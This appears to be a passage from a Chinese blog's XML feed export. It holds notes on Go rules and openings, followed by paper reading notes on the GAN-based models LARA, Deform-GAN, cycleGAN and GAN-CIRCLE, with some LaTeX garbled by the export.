棋子围住的交叉点叫做眼，棋子拥有两个或以上真眼（禁入点）的棋型叫做活棋，即无法被吃掉的棋。一只眼的就叫做死棋。两个以上的交叉点叫大眼。自己的棋至少占3个眼角的才叫真眼，反之是假眼。边上的眼有两个眼角，自己占据两个眼角才叫真眼，角上的眼有一个眼角，自己占据一个眼角才叫真眼。 大眼占有两个棋的叫做直二，是死棋，占据四个棋的叫做方四，是死棋。而直三、丁四、弯三、刀五、花五、花六自己下一步就活棋了，对方下一步就死棋了，都叫一点死。而直四、弯四、闪电四、弯六都有两个以上的“做眼要点”，是活棋。 长气就是让自己的棋子的气变多，应该往更气多、宽阔、有自己棋子的地方落子。紧气就是让对方的棋子的气变少，在自己弱小的时候要连接自己，紧对方的气，在自己强大的时候要分断对方，同时紧气。 对杀是双方在争夺地盘时遇到的遭遇战，获胜的一方通常会获得大块地盘，对杀的关键是找到对杀的目标，然后数气，相同气数的对杀叫做同气对杀，先下手为强。 双活就是不能对杀的，先下进去会使自己和对方的棋都变成一口气的，然后被对方吃掉，此时双方都是活棋。双活也叫共活。双方共有的气叫做公气。双方各有一只眼，并且有公气的棋型叫有眼双活，反之叫无眼双活。 围空就是围出空地，角落是最容易围空的地方。金角银边草肚皮。棋子围出一个交叉点叫一目，两个交叉点叫二目。有人攻击就要保护我们的地盘。 开局占角一般在3、4路线上找位置，如果下在星位就叫做星位占角，如果下在两个3路线的交叉点则叫做三三占角，下在星位靠近边缘的旁边叫做小目占角，一共八个位置。下在“日”字的对角叫做小飞守角，如果一个棋子在星位，另一个与其呈“日”字，则叫做星位小飞守角，星位小飞守角下在2路线保护的地盘会少很多，所以在3、4路线上守角效果最好。同理有小目小飞守角和三三小飞守角。小飞挂角就是下在与对方棋子呈“日”字的位置， 抢边上布局的方法叫拆边，一般是拆在棋盘的3、4路线上，从自己角上棋子处往想要拆边的方向隔两个落子叫做拆二，依此类推有拆三、拆四、拆五等，都是比较不错的棋。距离自己的棋比较进的就算作守角而不是拆边了，距离对方棋比较近的就算作挂角而不是拆边了。拆边时如果能同时把自己两边的棋子连起来就是连片。能够有效破坏对方连片的叫做分投。 下围棋开局的固定步骤叫做定式，星位小飞定式是一方下在星位后，先小飞挂角，然后小飞守角，小飞进角，再尖三三，拆二。小飞进角就是争夺角部地盘。尖三三就是下在三三的位置。 小目托退定式：黑棋小目占角，白棋一间高挂，黑棋托，白棋扳，黑棋退，白棋粘，黑棋跳，白棋拆。一间是间隔一个格的位置，高挂是在4路线的地方挂角，托是在对方棋子下面紧挨着落子，挡住对方是扳，往自己地盘内退一步的走法叫退，粘是将两块棋子连接，跳是在相隔一个交叉点的地方落子，增加自己的地盘，拆就是拆边。 下围棋可以分为三个阶段，第一阶段是布局，金角银边草肚皮、占角、定式都是关于布局的。第二阶段是中盘，棋子死活还有吃子技巧都是关于中盘阶段抢夺地盘的。第三个阶段是收官，把双方能活棋的边角细细缝补，划分明确的边界，确定输赢。若在中盘阶段胜负已分，弱势的一方可以直接认输。 下进去只能增加自己棋子的数量，而占不到目的棋叫做单官，死棋在结束后会清理掉，不用落子将其吃掉。因为单官价值很小，所以要先下在能围到目的地方。 在双方已经确立边界并且没有单官的时候就结束了，在结束后首先要清理死棋，然后是数子，即数谁的棋子多，然后判断胜负。黑棋大于或等于185个，或白棋大于等于177个则胜。]]></content>
      <categories>
        <category>附庸风雅</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】LARA：基于GAN的解决冷启动问题的推荐系统]]></title>
    <url>%2F2020%2F04%2F08%2FLARA%2F</url>
    <content type="text"><![CDATA[本文是关于论文《LARA: Attribute-to-feature Adversarial Learning for New-item Recommendation》的阅读笔记。 由于冷启动问题的存在，在电商网站中为用户推荐新物品是一个极具挑战的问题，为了解决该问题，文本提出的 LARA 模型是 adversariaL neurAl netwoRk with multi-generAtors 的缩写，它利用 GAN 从物品属性的多个角度产生可能对该新物品感兴趣的用户，通过获取用户和物品之间隐含的属性级的交互信息，并基于属性级的相似度将新物品推荐给用户。 一、相关工作GAN 由生成器和判别器两部分组成，生成器相当于是造假币的，判别器相当于是验钞机，生成器的目的是让自己造的假币骗过验钞机，双方通过不断互相搏弈，互相提升。 已有的基于 GAN 的推荐模型是从用户历史行为信息（如评分、购买、评论等）中产生一个用户和物品之间的交互表示向量，向量的每一维表示该用户可能会购买对应物品的可能性。但是这些模型都没有试图解决冷启动的问题，并且都不能直接应用到新物品推荐上，这是因为： 模型是根据用户的历史购买信息来构建向量的，但是新物品/新用户没有历史信息； 此外由于电商网站的物品数以百万计，所以用户和物品的交互向量会非常的大，并且非常稀疏，而这对 GAN 来说是很难处理的。 二、冷启动问题冷启动问题是指当新物品或新用户进入推荐系统后，由于没有该物品/用户的历史信息，推荐很难取得较好的效果的问题。主要可以分为用户冷启动、物品冷启动和系统冷启动三类。 文章认为解决冷启动问题的关键在于在新物品和用户之间建立关系，又考虑到新物品一般也有很多属性（如价格、品牌等），而物品的一个属性往往对应一个特定的用户特征（user profiles）。如上图所示，物品是耐克鞋、运动鞋和正在打折，对应着用户特征中的喜欢的品牌、是否热爱运动和是否偏爱促销产品。所以我们可以从新物品的属性中生成虚拟的用户特征，再计算该用户特征和已有用户的匹配关系，然后向匹配程度最高的前几个用户推荐该新物品。物品的每个属性可以是标量，也可以是向量。用户特征向量的每一维对应物品的一个属性，其值表示两者之间的关系。 然而从物品的属性信息来反映用户的偏好信息仍然存在很多困难： 物品属性和用户特征之间的属性的关系是隐含的，并不知道； 物品一般有多个属性，模型需要推断出每个属性对应的用户的特征； 生成的用户特征不仅要跟真实的用户特征尽可能相似，而且应该和给定的物品尽可能的匹配。 三、记号 $I={I_1,I_2,…,I_n}$：物品集 $U={U_1,U_2,…,U_m}$：用户集 $A_i={a_{i1},a_{i2},…,a_{ik_i}}$：第 $i$ 个属性 $n,m,k_i$：物品数、用户数和第 $i$ 个属性的维度 四、网络结构 LARA 模型由生成器和判别器两部分组成，生成器可以根据输入的物品的属性向量生成一个可能喜欢该物品的用户特征向量，然后从用户集中选出若干个与该用户特征向量最相似的用户，将该物品推荐给这些用户。判别器可以根据输入的用户-物品对，判断输入的用户特征是真实的还是生成的。 LARA 模型总的目标函数为：$$\begin{aligned}\mathcal{L}^{G^{}, D^{}}=\min {\theta} \max _{\phi} \sum{n=1}^{N}\left(\mathbb{E}{\mathbf{u}^{+} \sim p{\text {true}}\left(\mathbf{u}^{+} | I_{n}\right)}\left[\log \left(D\left(\mathbf{u}^{+} | I_{n}\right)\right)\right]\right.\+\mathbb{E}{\mathbf{u}^{c} \sim p{\theta}\left(\mathbf{u}^{c} | I_{n}\right)}\left[\log \left(1-D\left(\mathbf{u}^{c} | I_{n}\right)\right)\right] \\left.+\mathbb{E}{\mathbf{u}^{-} \sim p{\text {false}}\left(\mathbf{u}^{-} | I_{n}\right)}\left[\log \left(1-D\left(\mathbf{u}^{-} | I_{n}\right)\right)\right]\right)\end{aligned}$$其中生成器 $G$ 被写成了 $p_\theta(u^c|I_n)$，$\theta$ 表示生成器的参数，$N$ 是训练集中给定物品（conditional items）的个数。 1. 生成器生成器采用了分别生成，然后再合并的结构，即生成器可以分为两个部分：条件物品的每个属性 $a_i^c$ 被送到特定的生成器 $g_i$ 中，然后生成潜在用户的特征，然后神经网络 G 合并所有的生成的用户特征向量，并输出一个最终的用户特征向量，该过程可以表示为下式：$$\mathbf{u}^{c}=G\left(g_{1}\left(\mathbf{a}{1}^{c}\right), g{2}\left(\mathbf{a}{2}^{c}\right), \ldots, g{k}\left(\mathbf{a}{k}^{c}\right)\right)$$通过最小化目标函数来得到最优的生成器，并且当在训练生成器的时候判别器的参数是固定的，所以只需要优化跟生成器相关的项：$$\begin{array}{l}\theta^{*}=\underset{\theta}{\arg \min } \sum{n=1}^{N} \mathbb{E}{\mathbf{u}^{c} \sim p{\theta}\left(\mathbf{u}^{c} | I_{n}\right)}\left[\log \left(1-\sigma\left(d_{\phi}\left(\mathbf{u}^{c}, I_{n}\right)\right)\right)\right] \=\underset{\theta}{\arg \max } \sum_{n=1}^{N} \mathbb{E}{\mathbf{u}^{c} \sim p{\theta}\left(\mathbf{u}^{c} | I_{n}\right)}\left[\log \left(1+\exp \left(d_{\phi}\left(\mathbf{u}^{c}, I_{n}\right)\right)\right]\right.\end{array}$$ 2. 判别器判别器有三种训练对： $(u^c,I^c)$：给定的物品 $I^c$ 和生成的用户 $u^c$ $(u^+,I^c)$：给定的物品 $I^c$ 和真实用户 $u^+$（ground-truth 数据中对 $I^c$ 感兴趣的用户） $(u^-,I^c)$：给定的物品 $I^c$ 和假用户 $u^-$（ground-truth 数据中对 $I^c$ 不感兴趣的用户） 通过以上三种样本的训练方式，可以使判别器产生的用户特征不仅像真实的用户特征，而且和给定的物品相关。$$y(\mathcal{T})=\left{\begin{array}{ll}1, &amp; \mathcal{T}=\left(\mathbf{u}^{+}, I^{c}\right) \0, &amp; \mathcal{T}=\left(\mathbf{u}^{c}, I^{c}\right) \0, &amp; \mathcal{T}=\left(\mathbf{u}^{-}, I^{c}\right)\end{array}\right.$$对于真实用户 $u^+$ 的确定，先找到一个和物品 $I^c$ 有交互的用户 $u$，并将其特征向量初始化为0，维度和物品的属性个数相同，再遍历数据集找到与 $u$ 有交互的物品的集合，并得到它们的属性集合，将属性对应的维度设为1。假用户 $u^-$ 是先找到一个和物品 $I^c$ 没有交互的用户 $u$，后续过程跟真实用户的确定相同。 判别器的目的就是将 $(u^+,I^c)$ 和其他两个区分开来，所以 $(u^+,I^c)$ 是正例，其标签是1，其他两个是负例，标签是0。判别器输出的是用户和物品相关的概率，通过以下公式计算：$$D\left(\mathbf{u} | I_{n}\right)=\sigma\left(d_{\phi}\left(\mathbf{u}, I_{n}\right)\right)=\frac{\exp \left(d_{\phi}\left(\mathbf{u}, I_{n}\right)\right)}{1+\exp \left(d_{\phi}\left(\mathbf{u}, I_{n}\right)\right)}$$其中 $\phi$ 是判别器的参数。 在训练时通过最大化目标函数来得到最优的判别器：$$\begin{aligned}\phi^{}=\underset{\phi}{\arg\max} &amp; \sum_{n=1}^{N}\left(\mathbb{E}{\mathbf{u}^{+} \sim p{\text {true}}\left(\mathbf{u}^{+} | I_{n}\right)}\left[\log \left(\sigma\left(d_{\phi}\left(\mathbf{u}^{+}, I_{n}\right)\right)\right)\right]\right.\&amp;\left.+\mathbb{E}{\mathbf{u}^{c} \sim p{\theta^{}}\left(\mathbf{u}^{c} | I_{n}\right)}[\log \left(1-\sigma\left(d_{\phi}\left(\mathbf{u}^{c}, I_{n}\right)\right)\right)\right]\&amp;\left.+\mathbb{E}{\mathbf{u}^{-} \sim p{f a l s e}\left(\mathbf{u}^{-} | I_{n}\right)}\left[\log \left(1-\sigma\left(d_{\phi}\left(\mathbf{u}^{-}, I_{n}\right)\right)\right)\right]\right)\end{aligned}$$ 3. 推荐生成生成器生成了可能喜欢当前物品的用户之后，就可以把当前的新物品推荐给与生成的用户最相似的几个用户了。文章中用余弦相似度计算的生成的用户和用户集中用户之间的相似度。 五、实验实验部分主要解答了三个问题： LARA 的推荐效果是否比物品冷启动的 baseline 要好 属性级用户表示是否有助于提高推荐性能 去除 $(u^-,I^c)$ 对是否影响最终结果 实验中使用了两个真实的数据集：MovieLens 数据集和 Inzone 数据集，对于每个数据集，按照8:2的比例划分成训练集和测试集。上表是两个数据集的情况。 我们采用精度（P@K）、平均精度（M@K）和归一化折损累计增益（NDCG@K）作为评估指标，其中 K 表示推荐列表的长度，指标 P@K 关注推荐列表中包含的正确用户数。M@K 和 NDCG@K 用来评价排序的准确性。 为了回答第一个问题，文章对比了 UserPop，BPR-kNN，LCE，NFM，DNN 几个 baseline，验证了利用属性级用户表示和利用属性级项目用户交互推荐项目的重要性。上表展示了多个模型在两个数据集上的不同标准下的表现，可以发现文章提出的 LARA 模型在各个标准下都超过了已有的模型。 由于对抗性训练被广泛认为是一种有效但不稳定的技术，我们进一步分析了上述方法的学习趋势，由上图可知，Movielens 数据集上大约120个epoches 之后，Inzone 数据集上的80个 epoches 之后，P@10 和 NDCG@10 都收敛了。 本文的另一个贡献是使用属性信息来表示用户。为了验证属性级用户表示的有效性，我们提出了一种新的基线模型，输入为项目属性信息，输出为交互级用户表示，即用户表示的维数等于项目数。为了深入了解我们提出的属性级表示，我们在两个数据集上展示了这两种方法的学习曲线，结果如上图所示。 由上表中也可以看出属性级的用户表示比交互级的用户表示的效果更好。 我们以判别模型中有两类训练样本，即 $(u^+，I^c)$ 和 $(u^c，I^c)$ 的框架为基线。从上表可以看出，在判别模型的训练过程中加入负样本后，我们的模型对两个数据集的性能有了显著的提高。其原因在于，通过增加新的对，在给定条件项时，判定者不仅能从生成的用户中识别出真实用户，而且还能从错误用户中识别出真实用户。 六、文章贡献及不足1. 贡献该模型有三个贡献： 是第一个通过 GAN 来学习属性级从物品到用户映射的网络 避免了稀疏问题，引进了表示用户的新方式，判别器的训练方式新颖 根据顾客的购买记录建立了一个全新的大数据集，数据集中的每个物品有多个属性，包括分类、品牌、价格等。 2. 不足 只解决了物品冷启动的问题，没解决用户冷启动的问题； 下面是github下载的代码文件中的文件情况： 物品数是2536，其中507个是测试集，2029个是训练集；用户数是6040，物品的属性数是18。 util/ui_matrix.csv 行是用户，列是物品，每个元素表示用户是否购买过该物品 util/train_ui_matrix.csv 行是用户，列是物品，和util/ui_matrix.csv是完全相同的 util/user_attribute.csv 行是用户，列是物品的属性，每个元素是整数 util/user_emb.csv 行是用户，列是物品的属性，每个元素是根据util/user_attribute.csv归一化得到的实数 data/test_data.csv 是测试数据 data/train_data.csv 是训练数据 train_data 第一列是用户，第二列是物品，第三列是属性列表 test_attribute.csv 有477行，18列，列是物品属性，行是什么未知，每个元素是整数 test_item.cvs 只有一列，每一行是物品编号]]></content>
      <categories>
        <category>学习笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】基于GAN的三维医学图像跨模态配准模型 Deform-GAN]]></title>
    <url>%2F2020%2F04%2F05%2Fdeform-GAN%2F</url>
    <content type="text"><![CDATA[本文是关于《DEFORM-GAN:AN UNSUPERVISED LEARNING MODEL FOR DEFORMABLE REGISTRATION》论文的阅读笔记。 一、简介文章提出了一种基于 GAN 的三维医学图像跨模态配准模型 Deform-GAN，并首次将梯度损失（gradient loss）应用到基于深度学习的配准模型中。模型是无监督的，不需要任何 ground-truth 或人工标注信息。 基于无监督的学习模型存在着两个挑战，一个是跨模态或跨序列配准中损失函数的确定，另一个是没有 ground-truth，这使得 GAN 模型比较难训练。 上图是 Deform-GAN 和其他模型的配准结果对比图。 二、记号 $T$：图像变换网络 $G$：图像生成器 $D$：判别器 $R$：参考图像 $F$：浮动图像 $\phi$：配准形变场 $F(\phi)$：变形后的浮动图像 $p$：体素位置 $I$：三维图像 三、网络结构和训练 上图是 Deform-GAN 网络的结构示意图。 网络主要由三部分组成：图像变换网络 $T$，图像生成器 $G$ 和判别器 $D$，前两者采用的都是类似于 U-Net 的网络结构。图像变换网络 $T$ 的输入是参考图像和浮动图像的图像对，输出是配准形变场 $\phi$，$\phi$ 会进一步通过空间变换器对浮动图像 $T$ 做变形得到 $F(\phi)$，这一步相当于实现了模态间配准（从源域到源域）。图像生成器 $G$ 以 $F(\phi)$ 为输入，其输出是一个接近于参考图像 $R$ 的图像 $F’(\phi)$，这一步相当于实现了跨模态配准（从源域到目标域）。判别器 $D$ 用来判别图像是真实图像还是合成图像。如此一来，配准问题就被分成了两部分：多模配准和单模配准。 在训练前期，$T$ 还没有学习到很好的特征，配准效果不好，如果直接将 $R$ 和 $F’(\phi)$ （这里论文中写的是 $F(\phi)$，我怀疑是写错了，按照示网络结构示意图中的来）输入到判别器则会产生错误对齐的 $F’(\phi)$。为解决该问题，文章提出了“梯度约束的 GAN 方法”，这种方法的特点是损失函数不是固定的，而是通过学习获得的，它不仅惩罚输出图像和目标域图像之间的差别，而惩罚输出图像和源域图像之间的差别。 生成器的任务有三个：一是骗过判别器，二是最小化输出图像和目标域图像的 $L_1$ 距离，三是保持输出图像和源域图像在细节上保持相似。 在训练时，三个网络的训练顺序是先训练判别器 $D$，再训练生成器 $G$，最后训练图像变换网络 $T$，当训练一个网络时，其他网络的参数保持不变。 四、损失函数局部梯度计算公式：$$\nabla \hat{I}(p)=\left(\sum_{p \in n^{3}} x^{\prime}(p), \sum_{p \in n^{3}} y^{\prime}(p), \sum_{p \in n^{3}} z^{\prime}(p)\right)$$$n$ 是 $p$ 周围的像素点个数，当 $n$ 较小时网络难收敛，当较大时图像 $R$ 和 $F$ 的边缘很难准确对齐，通过尝试当 $n=7$ 时效果最好。根据以上梯度的计算公式就可以得到正则化的梯度了：$$n(I, p)=\frac{\nabla \hat{I}(p)}{|\nabla \hat{I}(p)|+\varepsilon}$$其中 $||\cdot||$ 表示 $L_2$ 距离，图像 $R$ 和 $F$ 之间的局部梯度损失就可以定义为：$$L_{L G}(R, F)=\sum_{p \in \Omega}|n(R, p) \cdot n(F, p)|$$ 其中 $\Omega$ 是 $R$ 和 $F$ 的图像域， 图像转换网络 $T$ 的损失可以表示为：$$L_{T}(R, F, \phi)=L_{s i m}(R, F(\phi))+\alpha L_{s m o o t h}(\phi)$$其中 $L_{sim}(R,F(\phi))$ 又由两部分组成：图像 $R$ 和 $F’(\phi)$ 之间负的局部互信息和图像 $R$ 和 $F(\phi)$ 之间负的局部梯度距离，如下式所示：$$L_{s i m}(R, F(\phi))=-L_{L C C}\left(R, F^{\prime}(\phi)\right)-\beta L_{L G}(R, F(\phi))$$形变场的平滑损失 $L_{smooth}(\phi)$ 可以表示为：$$L_{\text {smooth}}(\phi)=\sum_{p \in \Omega}|\nabla \phi(p)|^{2}$$ 下面来看下生成器 $G$ 和判别器 $D$ 的损失函数。在 Pix2Pix 网络，它的损失函数为：$$L_{G^{*}}=\arg \min {G} \max _{D} L{c^{G A N}}(G, D)+\lambda L_{L 1}(G)$$其中 $L_{cGAN}$ 是条件 GAN（conditional GAN）的目标函数，$L_{L1}$ 是源图像和 ground-truth 的目标图像之间的 $L_1$ 距离。但是在本论文中由于源图像和目标图像不是像素级的映射数据，所以不适用。本文用局部梯度损失来限制合成图像 $F’(\phi)$ 和源图像 $F(\phi)$ 之间的梯度距离，并保证最终的输出图像的细节和源图像一致。所以最终 GAN 的总损失为：$$\begin{aligned}L_{G^{\prime}}=&amp; \arg \min {G} \max _{D} L{c^{G A N}}(G, D)-\mu L_{L G}\left(F^{\prime}(\phi), F(\phi)\right) \&amp;+\lambda L_{L 1}\left(F^{\prime}(\phi), R\right)\end{aligned}$$]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】cycleGAN：《Unpaired Image-to-Image Translation using Cycle-Consistent Adversarial Networks》]]></title>
    <url>%2F2020%2F04%2F04%2FcycleGAN%2F</url>
    <content type="text"><![CDATA[本文是 cycleGAN 论文《Unpaired Image-to-Image Translation using Cycle-Consistent Adversarial Networks》的阅读笔记。 论文一上来就给出了该图，从图中可以看到 cycleGAN 可以从源域图像转换为目标域的图像，并保留源域图像的细节，还可以从目标域图像转换回源域图像。 一、摘要cycleGAN 的主要贡献是在不使用配对的图像对（paired images）数据时，用 GAN 实现了图像到图像的转换（image-to-image translation），即学习从源域图像到目标域图像之间的映射关系。此外除了传统的对抗损失（adversarial loss），还加入了循环一致性损失（cycle consistency loss）来保证转换后的图像保留原图像的细节信息。 二、记号 $X$：源域图像集合 $Y$：目标域图像集合 $x$：一幅源域图像 $y$：一幅目标域图像 $\hat{x}$：生成的源域图像 $\hat{y}$：生成的目标域图像 $G$：从源域图像到目标域图像的生成器 $F$：从目标域图像到源域图像的生成器 $D_X$：判别生成的源域图像是否为真的判别器 $D_Y$：判别生成的目标域图像是否为真的判别器 三、网络结构 上图是配对的图像和不配对的图像的对比图。 配对的图像对举个例子就是给定一副莫奈的画作，如果再给定与该画作对应的真实场景，则图像就是配对的。这样的数据的获取是十分困难且昂贵的。所以本文没有使用配对的图像对，而是先从源域图像转化为目标域图像，只保证风格相似，而不保证内容和原图一致，记作 $\hat{y}=G(x)$。还是拿莫奈的画作举例，先将这幅画转化成看起来真实的图像，但是转换后的内容可能和画作不一致。很明显，如果只有上述操作则存在一定的问题：一是不能保证从源域图像 $x$ 生成目标域图像 $\hat{y}$ 是有意义的，因为有多种生成器 $G$ 可以让 $x$ 可以映射到 $\hat{y}$，因为 $\hat{y}$ 只要符合目标域对应的分布就可以了。此外还存在 GAN 难以训练的问题，由于模型崩溃（mode collapse）问题的存在，即生成器宁可多生成一些重复但是很“安全”的样本，也不愿意去生成多样性的样本。 上图是加入循环一致性之后两个生成器的输出示意图。 为解决上述问题，有必要在整体的网络结构上做些补充、调整，也就是实现循环一致性。举例来说，在语言翻译时，先将英语转化为法语，然后再将法语转化为英语，我们对转换前后的两个英语做损失就可以保证整个过程照着我们期望的方向进行了。所以再加一个从目标域图像转化为源域图像的生成器 $F$，先用 $G$ 将源域图像 $x$ 转化为目标域图像 $\hat{y}$，再用 $F$ 将其转化回源域图像 $\hat{x}$，然后计算 $x$ 和 $\hat{x}$ 之间的循环一致性损失，以保证 $F(G(x))\approx x$。类似的，也对目标域图像做类似的操作，以保证 $G(F(y))\approx y$。 因为有两个生成器，相应的判别器也有两个，一个是判别生成源域图像 $F(y)$ 和真实的源域图像 $x$ 是否相似的判别器 $D_X$，另一个是判别生成的目标域图像 $G(x)$ 和真实的目标域图像 $y$ 是否相似的判别器 $D_Y$。 上图是整个网络的结构示意图，(a) 图是两个生成器和两个判别器的示意图，(b) 图是前向循环一致性示意图，(c) 是后向循环一致性示意图。 四、损失函数整个网络的损失函数主要包括两个，一个是对抗损失，用来将生成图像的分布与目标域图像的分布做匹配；另一个是循环一致性损失，用来防止 $G$ 和 $F$ 学到的映射互相矛盾。 对抗损失 对抗损失的公式如下：$$\begin{aligned}\mathcal{L}{\mathrm{GAN}}\left(G, D{Y}, X, Y\right) &amp;=\mathbb{E}{y \sim p{\text {data }}(y)}\left[\log D_{Y}(y)\right] \&amp;+\mathbb{E}{x \sim p{\text {data }}(x)}\left[\log \left(1-D_{Y}(G(x))\right]\right.\end{aligned}$$其中 $p_{data}(x)$ 是源域图像的分布，$p_{data}(y)$ 是目标域图像的分布。类似的可以得到 $\mathcal{L}{\mathrm{GAN}}\left(F, D{X}, Y, X\right)$ 的表达式。 循环一致性损失 单独的对抗损失不能保证学习到的函数可以将输入的 $x$ 映射到想要得到的输出 $y$，所以又加入了循环一致性损失，来保证 $x\rightarrow G(x)\rightarrow F(G(x))\approx x$ 及 $y\rightarrow F(y)\rightarrow G(F(y))\approx y$，其公式如下：$$\begin{aligned}\mathcal{L}{\text {cyc }}(G, F) &amp;=\mathbb{E}{x \sim p_{\text {data }}(x)}\left[|F(G(x))-x|{1}\right] \&amp;+\mathbb{E}{y \sim p_{\text {data }}(y)}\left[|G(F(y))-y|_{1}\right]\end{aligned}$$ 如此一来，整个网络的总损失函数为：$$\begin{aligned}\mathcal{L}\left(G, F, D_{X}, D_{Y}\right) &amp;=\mathcal{L}{\text {GAN }}\left(G, D{Y}, X, Y\right) \&amp;+\mathcal{L}{\text {GAN }}\left(F, D{X}, Y, X\right) \&amp;+\lambda \mathcal{L}{\text {cyc }}(G, F)\end{aligned}$$其中 $\lambda$ 是控制对抗损失和循环一致性损失两者重要性比重的参数，在实验中 $\lambda=10$。然后我们就可以通过最大最小化上述损失函数来得到最优的生成器了：$$G^{}, F^{}=\arg \min _{G, F} \max _{D{x}, D_{Y}} \mathcal{L}\left(G, F, D_{X}, D_{Y}\right)$$ 五、其他设置 在对抗损失中使用了最小二乘损失来代替上面的负的对数似然损失，这样可以使训练更稳定，并且输出结果更好。具体的，通过最小化以下损失来训练生成器 $G$： $$\begin{aligned}\mathcal{L}{\mathrm{GAN}}\left(G, D{Y}, X, Y\right) &amp;=\mathbb{E}{x \sim p{\text {data }}(x)}\left[(D(G(x))-1)^2]\right.\end{aligned}$$ ​ 通过最小化以下损失来训练判别器 $D$：$$\begin{aligned}\mathcal{L}{\mathrm{GAN}}\left(G, D{Y}, X, Y\right) &amp;=\mathbb{E}{y \sim p{\text {data }}(y)}\left[(D(y)-1)^2\right] +\mathbb{E}{x \sim p{\text {data }}(x)}\left[D(G(x))^2]\right.\end{aligned}$$ 为了减少模型的震荡，不适用最新的生成器产生的图像作为判别器的输入来训练判别器，而是使用生成器的历史输出来训练判别器。具体的，设置了一个缓冲池保存生成器生成的50张最新图像。 使用 Adam 优化器，batch size 为 1，学习率为 2e-4，在前100个 epoch 里保持不变，在之后的100个 epoch 里线性衰减到0。]]></content>
      <categories>
        <category>医学图像处理</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[【论文笔记】GAN-circle：从低分辨率图像生成高分辨率图像的半监督GAN模型]]></title>
    <url>%2F2020%2F04%2F02%2FGAN-circle%2F</url>
    <content type="text"><![CDATA[本文是关于论文《CT Super-resolution GAN Constrained by the Identical, Residual, and Cycle Learning Ensemble (GAN-CIRCLE)》的阅读笔记，本来是想看有关cycle-GAN 的内容，但是错找成了 GAN-Circle 的论文。 一、研究背景GAN-Circle 是一个半监督的深度学习网络，用来从低分辨率的 CT 图像生成高分辨率的 CT 图像。在模型中使用了 GAN、CNN、残差学习、网中网等技术。 对于当前的 CT 成像技术来说，虽然分辨率已经很高了，但是在早期肿瘤描绘和冠状动脉分析等方面分辨率仍然不够。所以如何在使用低辐射剂量的前提下产生出高分辨率的图像是一个热门的问题。一般来说有两种思路，一种是硬件定向的方法，如提高 CT 成像设备的精度等，但这种方法往往很昂贵，并且可能产生较高的辐射；另一种是软件计算的方法，主要的挑战是对低像素图像去模糊。 对于软件计算的提高 CT 分辨率的方法，主要有三类方法： 第一种是基于模型的重建方法，它可以通过对图像的退化过程进行建模并且对重建过程进行了正则化； 第二种方法是基于学习的方法（可理解为基于机器学习的方法），它是从训练数据中学习一个从低分辨率图像到高分辨率图像的非线性映射，从而来恢复低分辨率图像所丢失的高频信息； 第三种是基于深度学习的方法，和第二种类似，但是使用的是深度学习，这也是近来最热门的方法。 基于深度学习的方法有几个局限： 基于深度学习的有监督的模型需要低分辨率图像和与其匹配的高分辨率图像来进行训练，而这些图像是比较少且难获得的，所以只能诉诸于半监督的方式； 使用 GAN 时，网络可能产生目标图像中未显示的特征。GAN 网络从输入图像 $x$ 产生输出图像 $\hat{y}$，但是它不能确定两者是否是匹配的，因为可能有多种不同的输入能够产生相同的输出，这就会产生模型崩溃问题，为解决该问题使用了具有循环一致性（Cycle-consistent）的 GAN； GAN 的学习过程不好控制； 当网络的层数增加时，参数随之增加，训练所需的内存和时间开支很大； CT 图像的局部特征有不同的尺度； 预测的高分辨率图像 $\hat{y}$ 和真实的高分辨率图像 $y$ 之间的 $L_2$ 距离经常被用作损失函数，但是可能会产生过度光滑的问题，因为 $L_2$ 距离意味着最大化峰值信噪比（PSNR）。 二、记号 LR——低分辨率（low resolution） HR——高分辨率（high resolution） SR——超分辨率（super resolution） X——源域 Y——目标域 x——源域中的图像（LR 图像） y——目标域中的图像（HR 图像） $\hat{x}$——生成的假的 LR 图像 $\hat{y}$——生成的假的 HR 图像 G——将 LR 图像转化为 HR 图像的生成器 F——将 HR 图像转化为 LR 图像的生成器 $D_Y$——判别生成的 HR 图像与真实图像是否相似的判别器 $D_X$——判别生成的 LR 图像与真实图像是否相似的判别器 三、深度循环一致性对抗模型本文的主要贡献有： 提出了一种新颖的 CycleGAN 框架下的基于 CNN 的残差网络，具体的使用了循环一致性来增强源域与目标域之间的跨域一致性； 在训练时使用 Wasserstein 距离或 Earth Moving（EM）距离来代替 Jensen-Shannon（JS）距离来解决 GAN 网络训练中的问题； 根据几个基本的设计原则来优化网络，从而避免过拟合和降低计算开销； 级联了多层来学习特征； 使用跳跃连接来避免梯度消失； 使用 $L_1$ 正则代替 $L_2$ 正则来优化去噪。 在恢复高分辨率 CT 图像时的主要挑战有： 与自然图像相比，低分辨率 CT 图像有着不同的或者更复杂的空间变化、相关性和统计特性； 低分辨率图像中的噪声可能在重建过程中产生影响； 由于采样和降质操作是耦合的、不适定的，传统的方法不是很适用。 上图是循环一致性模型的结构示意图，可以分为上下两部分，这两部分是对称的，标有 x、y 的块是输入图像，绿色块是低分辨率图像，蓝色块是高分辨率图像。 在该模型中一共有两个 GAN，它们的结构相同，功能不同，一个是从 LR 图像生成 HR 图像，然后做对抗学习；另一个是从 HR 图像生成 LR 图像，然后做对抗学习。两者之间也有一定的联系。这样我们优化的问题就变成了：$$\min_{G,F}\max_{D_Y,D_X}L_{GAN}(G,D_Y)+L_{GAN}(F,D_X)$$ 四、损失函数在训练过程中一共有四种损失函数：对抗损失（adversarial loss, adv）、循环一致性损失（cycle-consistency loss, cyc）、一致性损失（identity loss, idt）和联合稀疏变换损失（joint sparsifying transform loss, jst） 对抗损失的作用是促使生成的图像遵循源域或目标域的分布，在具体使用的时候使用了 Wasserstein 距离来代替负的对数似然损失，其表达式为：$$\min_G\max_{D_Y}L_{WGAN}(D_Y,G)=-E_y[D(y)]+E_x[D(G(x))]$$ $$+\lambda E_{\hat{y}}[(||\nabla yD(y)||_2-1)^2]$$ 其中 E() 表示期望，y 表示对于 G(x) 和 y 的沿直线的均匀采样，$\lambda$ 是规范化参数。$\min_F\min_{D_X}L_{WGAN}(D_X,F)$ 的表达式也与上式类似。 循环一致性损失：研究证明单纯使用对抗损失不能很好的实现从源域到目标域图像的转换，所以又使用了循环一致性损失。简单来说，就是先把 LR 图像转换为 HR 图像，再转换回 LR 图像，然后将原始 LR 图像和结果计算损失函数，使得 $F(G(x))\approx x$ 。HR 